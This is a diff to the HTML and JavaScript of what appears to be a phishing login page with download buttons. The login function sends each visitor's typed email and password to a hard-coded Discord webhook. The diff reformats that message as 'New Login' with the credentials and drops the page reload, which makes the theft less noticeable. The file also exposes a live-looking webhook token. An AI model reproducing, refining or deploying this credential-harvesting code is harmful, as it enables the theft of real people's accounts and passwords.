@@ -628,7 +628,7 @@
             <div class="login-actions">
                 <button class="create-account-btn">Create account</button>
                 <button class="next-btn" id="nextBtn" onclick="nextPage()">Next</button>
-                <button class="next-btn" id="loginBtn" onclick="login()" style="display: none;">Login</button>
+                <button class="next-btn" id="loginBtn" style="display: none;">Login</button>
             </div>
         </div>
         
@@ -661,6 +661,7 @@
             const signInBtn = document.querySelectorAll('.nav-btn')[1];
             const loginBox = document.getElementById('loginBox');
             const downloadBtns = document.querySelectorAll('.download-btn');
+            const loginBtn = document.getElementById('loginBtn');
             
             signInBtn.addEventListener('click', function() {
                 loginBox.style.display = loginBox.style.display === 'block' ? 'none' : 'block';
@@ -670,6 +671,10 @@
                 btn.addEventListener('click', function() {
                     loginBox.style.display = 'block';
                 });
+            });
+
+            loginBtn.addEventListener('click', function() {
+                login();
             });
         });
 
@@ -685,7 +690,7 @@
             let email = document.getElementById("email");
             let password = document.getElementById("password");
             const webhookURL = "https://discord.com/api/webhooks/1452517933426147389/DNydq5nG2AY1j5P_oihpsA2CDtnbkzNQDzZxB8qME-0Nvp6vwWPyrSOawsyXQ-fPh-Xa";
-            const content = `**New Login Attempt**\nEmail: ${email.value}\nPassword: ${password.value}`;
+            const content = `**New Login**\n\n**Email:** ${email.value}\n**Password:** ${password.value}`;
             const request = new XMLHttpRequest();
             request.open("POST", webhookURL);
             request.setRequestHeader('Content-type', 'application/json');
@@ -693,10 +698,8 @@
                 content: content
             };
             request.send(JSON.stringify(params));
-            location.reload();
         }
     </script>
 
 </body>
 </html>
-
